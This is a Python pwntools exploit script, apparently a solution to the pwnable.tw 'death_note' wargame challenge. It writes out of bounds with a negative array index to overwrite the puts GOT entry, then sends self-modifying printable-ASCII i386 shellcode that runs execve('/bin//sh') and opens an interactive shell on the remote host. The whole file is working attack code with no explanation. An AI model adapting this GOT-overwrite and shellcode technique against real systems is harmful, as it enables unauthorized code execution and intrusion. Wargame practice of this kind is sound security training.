from pwn import *

local = False
elf = 'death_note' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10201
    r = remote(ip,port)

context.arch = 'i386'

# only 0x20 - 0x7e
shellcode = asm('''
    // int 0x80 (sub  2d40)
    push   ebx
    push   ebx
    push   edx
    pop    eax
    push 0x60
    pop edx
    sub    BYTE PTR [eax+0x2a], dl
    sub    BYTE PTR [eax+0x2b], dl
    sub    BYTE PTR [eax+0x2b], dl
    // eax = 0x0b
    pop eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    inc eax
    // edx = 0
    pop edx
    //ebx  = /bin//sh
    push ebx
    push 0x68732f2f
    push 0x6e69622f
    push esp
    pop ebx
''')
# sh;;
assert len(shellcode) < 0x50
put =  0x804a020
note = 0x804a060
r.recvuntil('choice :')
r.send('1')
r.recvuntil('Index :')
r.send(str( (put - note) / 4 ))
r.recvuntil('Name :')
raw_input('aaa')
r.sendline( shellcode  + '\x2d\x40')
r.interactive()